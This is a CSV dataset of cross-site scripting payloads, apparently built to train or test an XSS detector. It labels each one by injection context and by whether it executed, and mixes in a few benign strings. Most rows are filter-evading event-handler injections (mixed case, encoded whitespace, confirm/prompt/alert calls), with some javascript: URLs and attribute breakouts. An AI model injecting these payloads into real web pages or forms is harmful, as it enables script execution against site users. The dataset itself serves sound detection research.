payload,context,exec,combined
<d3v%09oNpoiNTerEnTeR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09oNpoiNTerEnTeR%09=%09confirm()>v3dm0s
<DEtAilS%0dONToGgLE+=+(confirm)()%0dx//,html_text,0,CONTEXT_html_text <DEtAilS%0dONToGgLE+=+(confirm)()%0dx//
<a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s
<dETaiLs%09OnpOInteREnTeR%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <dETaiLs%09OnpOInteREnTeR%09=%09confirm()>
<A%0aoNMoUseoVeR+=+(confirm)()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0aoNMoUseoVeR+=+(confirm)()%0dx>v3dm0s
"<A/+/onpoinTErENtER%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A/+/onpoinTErENtER%09=%09a=prompt,a()%0dx>v3dm0s"
<HtML%0aOnPOInTeReNter%0d=%0d(prompt)``>,html_text,0,CONTEXT_html_text <HtML%0aOnPOInTeReNter%0d=%0d(prompt)``>
<detAiLs%0aoNtogGle+=+confirm()//,html_text,0,CONTEXT_html_text <detAiLs%0aoNtogGle+=+confirm()//
<dEtAils%0aOnToGglE%0a=%0a(prompt)``//,html_tag,1,CONTEXT_html_tag <dEtAils%0aOnToGglE%0a=%0a(prompt)``//
"<detaIlS%0dontOggLe%09=%09a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <detaIlS%0dontOggLe%09=%09a=prompt,a()>"
<DEtaiLs%0donPointereNter%09=%09(confirm)()%0dx>,html_text,0,CONTEXT_html_text <DEtaiLs%0donPointereNter%09=%09(confirm)()%0dx>
"<HTML%0dONMouSEoVEr%0d=%0da=prompt,a()//",html_tag,0,"CONTEXT_html_tag <HTML%0dONMouSEoVEr%0d=%0da=prompt,a()//"
"<DETAiLS%0aontoggLE+=+a=prompt,a()>",html_text,0,"CONTEXT_html_text <DETAiLS%0aontoggLE+=+a=prompt,a()>"
<A%0dOnpOiNTERentER%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dOnpOiNTERentER%09=%09(confirm)()%0dx>v3dm0s
<D3v%0aONmOuSeover%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aONmOuSeover%0a=%0a(confirm)()%0dx>v3dm0s
<d3V%0aOnMoUSEoVEr%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0aOnMoUSEoVEr%09=%09(confirm)()>v3dm0s
<a/+/ONMoUSEoVeR+=+(prompt)``>v3dm0s,html_tag,0,CONTEXT_html_tag <a/+/ONMoUSEoVeR+=+(prompt)``>v3dm0s
<dETaiLs%09OnpOInteREnTeR%09=%09confirm()>,html_text,0,CONTEXT_html_text <dETaiLs%09OnpOInteREnTeR%09=%09confirm()>
<A%0doNPOiNTEreNteR%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0doNPOiNTEreNteR%0a=%0a[8].find(confirm)%0dx>v3dm0s
"<D3v/+/onPOinterentEr%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3v/+/onPOinterentEr%0d=%0da=prompt,a()>v3dm0s"
"<dEtaILS/+/oNtogGlE%0d=%0da=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <dEtaILS/+/oNtogGlE%0d=%0da=prompt,a()%0dx>"
<A%09onMoUsEOVER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09onMoUsEOVER%09=%09confirm()%0dx>v3dm0s
<d3v%0aoNpOInTErEnTEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aoNpOInTErEnTEr%0d=%0d[8].find(confirm)>v3dm0s
<detAiLS%0donPoiNteREnter%0d=%0d(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <detAiLS%0donPoiNteREnter%0d=%0d(prompt)``%0dx>
"<DEtaILs%0dOnTOgGLE+=+a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <DEtaILs%0dOnTOgGLE+=+a=prompt,a()>"
<hTML/+/onmoUSEOVEr%09=%09(confirm)()//,html_text,0,CONTEXT_html_text <hTML/+/onmoUSEOVEr%09=%09(confirm)()//
"<Html/+/oNPoINTereNTER%09=%09a=prompt,a()//",html_text,0,"CONTEXT_html_text <Html/+/oNPoINTereNTER%09=%09a=prompt,a()//"
""";alert(location);//",script_block,1,"CONTEXT_script_block "";alert(location);//"
<a%09ONMOusEover%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09ONMOusEover%0a=%0a(confirm)()%0dx>v3dm0s
<d3v%0dONMOUsEOVeR%09=%09[8].find(confirm)>v3dm0s,url_navigation,0,CONTEXT_url_navigation <d3v%0dONMOUsEOVeR%09=%09[8].find(confirm)>v3dm0s
<dETAiLS%0donPOInTeRenTEr+=+(confirm)()%0dx//,html_text,0,CONTEXT_html_text <dETAiLS%0donPOInTeRenTEr+=+(confirm)()%0dx//
"<DEtaILS%0dontOGgle%0a=%0aa=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <DEtaILS%0dontOGgle%0a=%0aa=prompt,a()%0dx>"
<A%0aOnmoUSeoveR%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aOnmoUSeoveR%0a=%0aconfirm()>v3dm0s
<A/+/oNPoIntEreNTER%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/oNPoIntEreNTER%0a=%0a(prompt)``>v3dm0s
<A%0doNPOiNTEREnTER+=+(prompt)``>v3dm0s,html_text,0,CONTEXT_html_text <A%0doNPOiNTEREnTER+=+(prompt)``>v3dm0s
<DEtAils%0aOnTOggle+=+(confirm)()>,html_tag,0,CONTEXT_html_tag <DEtAils%0aOnTOggle+=+(confirm)()>
""" onmouseover=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onmouseover=alert(1) """
<a/+/ONPoInteRenteR+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <a/+/ONPoInteRenteR+=+confirm()>v3dm0s
<d3v%0doNpoIntErEntEr+=+[8].find(confirm)>v3dm0s,html_text,0,CONTEXT_html_text <d3v%0doNpoIntErEntEr+=+[8].find(confirm)>v3dm0s
<A%09ONMOuSeOVeR%09=%09(confirm)()>v3dm0s,html_attribute,0,CONTEXT_html_attribute <A%09ONMOuSeOVeR%09=%09(confirm)()>v3dm0s
<d3v/+/OnpoiNTeREnTeR%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/OnpoiNTeREnTeR%0a=%0a(prompt)``>v3dm0s
<Html/+/onPoiNterENteR%09=%09confirm()%0dx>,html_tag,0,CONTEXT_html_tag <Html/+/onPoiNterENteR%09=%09confirm()%0dx>
<HTMl%0aonmouseoVER+=+(confirm)()%0dx//,html_text,0,CONTEXT_html_text <HTMl%0aonmouseoVER+=+(confirm)()%0dx//
<HTMl/+/onpoiNTerenTer%0d=%0d(prompt)``>,html_text,0,CONTEXT_html_text <HTMl/+/onpoiNTerenTer%0d=%0d(prompt)``>
"<A%09OnpOINTeReNTER%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%09OnpOINTeReNTER%0a=%0aa=prompt,a()>v3dm0s"
<A/+/OnPOINTERenTEr+=+(prompt)``>v3dm0s,html_tag,0,CONTEXT_html_tag <A/+/OnPOINTERenTEr+=+(prompt)``>v3dm0s
<detAILS%0aONpOiNteReNTEr%09=%09[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <detAILS%0aONpOiNteReNTEr%09=%09[8].find(confirm)%0dx//
<D3v/+/ONmoUSEoVer%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/ONmoUSEoVer%0a=%0aconfirm()>v3dm0s
<D3V%0doNpoiNTEREnTEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0doNpoiNTEREnTEr%0d=%0d[8].find(confirm)>v3dm0s
<DeTails/+/ONToGGLe+=+(prompt)``%0dx//,html_text,0,CONTEXT_html_text <DeTails/+/ONToGGLe+=+(prompt)``%0dx//
"data:text/html,<img src=x onerror=alert(1)>",html_tag,0,"CONTEXT_html_tag data:text/html,<img src=x onerror=alert(1)>"
"<d3v%0dONMOUsEoVEr%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <d3v%0dONMOUsEoVEr%0a=%0aa=prompt,a()>v3dm0s"
<A%0dOnMoUSEOVER+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0dOnMoUSEOVER+=+confirm()>v3dm0s
<A%09ONmouseOVEr%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09ONmouseOVEr%09=%09confirm()>v3dm0s
"<D3v%0aonMoUSeoveR%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3v%0aonMoUSeoveR%09=%09a=prompt,a()>v3dm0s"
<a%0dOnPoinTeREntER%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0dOnPoinTeREntER%09=%09confirm()%0dx>v3dm0s
<htML%0aOnpOINTErENter+=+confirm()>,html_tag,0,CONTEXT_html_tag <htML%0aOnpOINTErENter+=+confirm()>
"<DETaILS%0aOnpointERenTeR%09=%09a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <DETaILS%0aOnpointERenTeR%09=%09a=prompt,a()//"
<html%0dONMOUSEOver%0d=%0d[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <html%0dONMOUSEOver%0d=%0d[8].find(confirm)%0dx>
<svg/,html_text,0,CONTEXT_html_text <svg/
"<details/+/ONpOinteRENTeR+=+a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <details/+/ONpOinteRENTeR+=+a=prompt,a()//"
<DETails%0donPOinTEReNtEr%09=%09(confirm)()//,html_tag,0,CONTEXT_html_tag <DETails%0donPOinTEReNtEr%09=%09(confirm)()//
<htmL/+/ONMOUsEOVer%0a=%0a(prompt)``>,html_tag,0,CONTEXT_html_tag <htmL/+/ONMOUsEOVer%0a=%0a(prompt)``>
"<hTML%09OnpoinTerENTER+=+a=prompt,a()>",html_text,0,"CONTEXT_html_text <hTML%09OnpoinTerENTER+=+a=prompt,a()>"
<HTML%0aonMouSeovEr+=+(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <HTML%0aonMouSeovEr+=+(confirm)()%0dx>
<dETAIls/+/oNtOgGlE+=+(confirm)()//,html_text,0,CONTEXT_html_text <dETAIls/+/oNtOgGlE+=+(confirm)()//
<A%09ONMOuSeOVeR%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09ONMOuSeOVeR%09=%09(confirm)()>v3dm0s
AT&T,html_text,0,CONTEXT_html_text AT&T
<DEtAILs%0aoNTOgGLE%09=%09confirm()>,html_tag,1,CONTEXT_html_tag <DEtAILs%0aoNTOgGLE%09=%09confirm()>
"<A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s"
<hTml%09OnpOiNTErenTer%0a=%0aconfirm()//,html_tag,0,CONTEXT_html_tag <hTml%09OnpOiNTErenTer%0a=%0aconfirm()//
"<a%0dOnmOusEoVEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%0dOnmOusEoVEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<DeTAILs/+/OnPOInTEreNtER%0d=%0d[8].find(confirm)>,html_text,0,CONTEXT_html_text <DeTAILs/+/OnPOInTEreNtER%0d=%0d[8].find(confirm)>
<a%09onpOiNTeRenTeR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09onpOiNTeRenTeR%0a=%0aconfirm()%0dx>v3dm0s
<detAiLS%09OnPOintErenTer%0d=%0d(confirm)()//,html_tag,0,CONTEXT_html_tag <detAiLS%09OnPOintErenTer%0d=%0d(confirm)()//
<deTAILS%0aOnpoINtErenTeR+=+confirm()>,html_tag,0,CONTEXT_html_tag <deTAILS%0aOnpoINtErenTeR+=+confirm()>
<a%0aonPOintEreNtER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aonPOintEreNtER%0d=%0dconfirm()%0dx>v3dm0s
<a%0aOnmOUSeOVeR+=+(prompt)``%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <a%0aOnmOUSeOVeR+=+(prompt)``%0dx>v3dm0s
<A%0donmOUSeovER%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0donmOUSeovER%0a=%0aconfirm()%0dx>v3dm0s
javascript:alert(1),url_href,1,CONTEXT_url_href javascript:alert(1)
<D3V%09onPoiNTERenTeR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09onPoiNTERenTeR%0a=%0a[8].find(confirm)>v3dm0s
width=100,html_text,0,CONTEXT_html_text width=100
<D3v%0dOnPoiNTerEnTEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0dOnPoiNTerEnTEr%0a=%0aconfirm()%0dx>v3dm0s
value=test,html_text,0,CONTEXT_html_text value=test
<A%0dONpoInTerEnTer+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <A%0dONpoInTerEnTer+=+confirm()>v3dm0s
%3Cdiv%3E,html_text,0,CONTEXT_html_text %3Cdiv%3E
<DeTails%09OnpOIntErENtEr%09=%09(prompt)``%0dx>,html_attribute,0,CONTEXT_html_attribute <DeTails%09OnpOIntErENtEr%09=%09(prompt)``%0dx>
<HtmL%09OnpointerENTeR%09=%09confirm()//,html_text,0,CONTEXT_html_text <HtmL%09OnpointerENTeR%09=%09confirm()//
<A/+/ONpoINtERenTER%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONpoINtERenTER%0a=%0a(prompt)``%0dx>v3dm0s
<dEtaIls%09onTOGGLE%09=%09(confirm)()%0dx//,url_href,0,CONTEXT_url_href <dEtaIls%09onTOGGLE%09=%09(confirm)()%0dx//
<d3v%0aonpoINtErentER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0aonpoINtErentER%0d=%0d[8].find(confirm)%0dx>v3dm0s
<dEtails/+/ontoGgle+=+confirm()>,html_tag,0,CONTEXT_html_tag <dEtails/+/ontoGgle+=+confirm()>
<d3V%0aONPointeRENtER%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0aONPointeRENtER%0d=%0dconfirm()>v3dm0s
<hTmL%09OnpoiNtEreNter%0d=%0d(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <hTmL%09OnpoiNtEreNter%0d=%0d(confirm)()%0dx//
<htML%0doNmoUseOvER%0d=%0d(prompt)``>,html_text,0,CONTEXT_html_text <htML%0doNmoUseOvER%0d=%0d(prompt)``>
<d3v/+/oNpOinTEreNter%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/oNpOinTEreNter%0a=%0a(confirm)()%0dx>v3dm0s
<A%09oNMOusEoVER%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09oNMOusEoVER%0d=%0d(confirm)()%0dx>v3dm0s
<hTML%0aoNPoInTeRenteR+=+confirm()//,html_tag,0,CONTEXT_html_tag <hTML%0aoNPoInTeRenteR+=+confirm()//
"<dETaIlS/+/ontoGGLE%0a=%0aa=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <dETaIlS/+/ontoGGLE%0a=%0aa=prompt,a()%0dx//"
"<D3V/+/oNMousEovEr%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3V/+/oNMousEovEr%09=%09a=prompt,a()%0dx>v3dm0s"
<D3v%0aONmOUsEover+=+(confirm)()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v%0aONmOUsEover+=+(confirm)()%0dx>v3dm0s
""" onmouseover=alert(1)",html_attribute,1,"CONTEXT_html_attribute "" onmouseover=alert(1)"
"<dETAILs%0dOnTOGgLE%0d=%0da=prompt,a()>",html_tag,0,"CONTEXT_html_tag <dETAILs%0dOnTOGgLE%0d=%0da=prompt,a()>"
<dETAILs%09ONpoinTerENteR%0d=%0d[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <dETAILs%09ONpoinTerENteR%0d=%0d[8].find(confirm)>
<Details%0aoNtoggLe+=+confirm()//,html_tag,0,CONTEXT_html_tag <Details%0aoNtoggLe+=+confirm()//
"<d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s"
<D3V%09oNmOUseoVeR%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09oNmOUseoVeR%0a=%0aconfirm()>v3dm0s
<D3v%09onpoInTerEnTer%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09onpoInTerEnTer%0d=%0dconfirm()>v3dm0s
<htmL%0doNPOintereNTeR+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <htmL%0doNPOintereNTeR+=+(confirm)()%0dx>
<D3v/+/ONMOUseoveR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/ONMOUseoveR%09=%09(prompt)``%0dx>v3dm0s
<HtML%0dONMOuSEoVer%0a=%0a[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <HtML%0dONMOuSEoVer%0a=%0a[8].find(confirm)>
"<deTaiLS%0aoNTOGgLe+=+a=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <deTaiLS%0aoNTOGgLe+=+a=prompt,a()%0dx>"
<d3V%0aonMoUseoVeR%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0aonMoUseoVeR%0d=%0d(prompt)``>v3dm0s
<HTML/+/oNMoUsEoVEr%0d=%0dconfirm()%0dx//,html_text,0,CONTEXT_html_text <HTML/+/oNMoUsEoVEr%0d=%0dconfirm()%0dx//
"<d3v/+/oNPOiNTeRenTer+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <d3v/+/oNPOiNTeRenTer+=+a=prompt,a()>v3dm0s"
<svg/onload=alert(String.fromCharCode(49))>,html_tag,1,CONTEXT_html_tag <svg/onload=alert(String.fromCharCode(49))>
<D3v/+/ONmoUSEoVer%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/ONmoUSEoVer%0a=%0aconfirm()>v3dm0s
<dETAiLs%0aONToggle%0a=%0aconfirm()//,html_tag,0,CONTEXT_html_tag <dETAiLs%0aONToggle%0a=%0aconfirm()//
<a%0aonpoIntEREnter+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <a%0aonpoIntEREnter+=+confirm()%0dx>v3dm0s
<a/+/oNMousEoVeR%09=%09(prompt)``%0dx>v3dm0s,script_block,0,CONTEXT_script_block <a/+/oNMousEoVeR%09=%09(prompt)``%0dx>v3dm0s
<D3v/+/OnmOuSeOver%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/OnmOuSeOver%0d=%0dconfirm()>v3dm0s
javascript:alert(navigator.userAgent),url_href,1,CONTEXT_url_href javascript:alert(navigator.userAgent)
<deTAils%09oNPOInTEREnTeR+=+(confirm)()>,html_text,0,CONTEXT_html_text <deTAils%09oNPOInTEREnTeR+=+(confirm)()>
"<DeTAIls%0aONpoiNtErENTEr%0d=%0da=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <DeTAIls%0aONpoiNtErENTEr%0d=%0da=prompt,a()%0dx//"
<A/+/oNpoiNterenteR+=+[8].find(confirm)>v3dm0s,html_tag,0,CONTEXT_html_tag <A/+/oNpoiNterenteR+=+[8].find(confirm)>v3dm0s
<a/+/OnMousEoVER%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/OnMousEoVER%0d=%0d(confirm)()%0dx>v3dm0s
<a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s
<d3V%0donmOUsEovER+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <d3V%0donmOUsEovER+=+confirm()>v3dm0s
<a%0aONpoIntERenteR%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aONpoIntERenteR%0d=%0d(confirm)()%0dx>v3dm0s
<d3v%0dONpOINteRENTER%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0dONpOINteRENTER%0a=%0a[8].find(confirm)>v3dm0s
"<a href=""javascript:"">",html_text,0,"CONTEXT_html_text <a href=""javascript:"">"
<D3V%09OnpOINTErENtER%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09OnpOINTErENtER%0a=%0a(confirm)()>v3dm0s
<D3V%0aoNMouSEoVer%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aoNMouSEoVer%09=%09(confirm)()>v3dm0s
<D3v%0donMOuSeOvER+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <D3v%0donMOuSeOvER+=+(prompt)``%0dx>v3dm0s
<a/+/OnPOINterEnTer%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnPOINterEnTer%09=%09(prompt)``%0dx>v3dm0s
<d3V%0donPoInTErEnter%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0donPoInTErEnter%0d=%0d(confirm)()>v3dm0s
<dETAiLS%0donPOInTeRenTEr+=+(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <dETAiLS%0donPOInTeRenTEr+=+(confirm)()%0dx//
<dEtaiLS%0aOnTOgGle%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <dEtaiLS%0aOnTOgGle%0a=%0aconfirm()%0dx//
"<a%0dOnPOInTerENter%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0dOnPOInTerENter%0d=%0da=prompt,a()%0dx>v3dm0s"
<HtML%0doNpoINTerEnTeR+=+[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <HtML%0doNpoINTerEnTeR+=+[8].find(confirm)%0dx>
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_text,0,CONTEXT_html_text </pre><marquee onmouseover=alert(1)>hover me</marquee
<hTMl/+/OnmouseOvER%0d=%0dconfirm()>,html_text,0,CONTEXT_html_text <hTMl/+/OnmouseOvER%0d=%0dconfirm()>
<svg onload,html_tag,0,CONTEXT_html_tag <svg onload
<DEtAilS%0aOnTOGGLE%0a=%0a(confirm)()//,html_text,0,CONTEXT_html_text <DEtAilS%0aOnTOGGLE%0a=%0a(confirm)()//
&#60;svg&#62;,html_text,0,CONTEXT_html_text &#60;svg&#62;
"<a%0dOnPOInTerENter%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%0dOnPOInTerENter%0d=%0da=prompt,a()%0dx>v3dm0s"
<D3V%0aoNmOuSEOvER%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aoNmOuSEOvER%0a=%0aconfirm()%0dx>v3dm0s
<d3V/+/ONpOinteRENtER%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/ONpOinteRENtER%0d=%0d(prompt)``>v3dm0s
<D3v%09ONPoiNTeRenter+=+(prompt)``>v3dm0s,html_text,0,CONTEXT_html_text <D3v%09ONPoiNTeRenter+=+(prompt)``>v3dm0s
<detaiLs/+/OnpOinTerENtEr%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <detaiLs/+/OnpOinTerENtEr%0a=%0aconfirm()%0dx//
<A%0aonmOuseoVer+=+confirm()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0aonmOuseoVer+=+confirm()%0dx>v3dm0s
<htMl%0aonpOInTEREnteR%0d=%0dconfirm()%0dx//,html_text,0,CONTEXT_html_text <htMl%0aonpOInTEREnteR%0d=%0dconfirm()%0dx//
<detAilS/+/onToGGLe+=+confirm()//,html_tag,0,CONTEXT_html_tag <detAilS/+/onToGGLe+=+confirm()//
"<D3V%0donmOUseoVeR%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%0donmOUseoVeR%09=%09a=prompt,a()%0dx>v3dm0s"
<D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s
<A/+/ONPointerenTeR%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/ONPointerenTeR%09=%09(confirm)()%0dx>v3dm0s
<A%0aoNpOinteReNtEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aoNpOinteReNtEr%0d=%0d(confirm)()>v3dm0s
<hTML%0donMOuseOVeR%0a=%0a(prompt)``>,html_text,0,CONTEXT_html_text <hTML%0donMOuseOVeR%0a=%0a(prompt)``>
"<a%0doNPointErEnTer%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%0doNPointErEnTer%09=%09a=prompt,a()%0dx>v3dm0s"
<DetailS%09ONtOGGLe+=+confirm()//,html_tag,0,CONTEXT_html_tag <DetailS%09ONtOGGLe+=+confirm()//
<d3V%09ONMOUSeover%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09ONMOUSeover%09=%09[8].find(confirm)>v3dm0s
<DETaIlS%09oNpoiNTERenteR%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <DETaIlS%09oNpoiNTERenteR%09=%09confirm()//
<d3V%09OnpOiNterENter+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <d3V%09OnpOiNterENter+=+confirm()>v3dm0s
<hTmL/+/oNMOusEOVeR+=+confirm()>,html_text,0,CONTEXT_html_text <hTmL/+/oNMOusEOVeR+=+confirm()>
<A/+/oNPOiNTERENtER%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/oNPOiNTERENtER%0a=%0aconfirm()>v3dm0s
<d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s
<htMl%09ONpOiNteREntEr+=+(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <htMl%09ONpOiNteREntEr+=+(confirm)()%0dx//
<d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s
"<A%09OnmOUSEOver%0d=%0da=prompt,a()>v3dm0s",url_href,0,"CONTEXT_url_href <A%09OnmOUSEOver%0d=%0da=prompt,a()>v3dm0s"
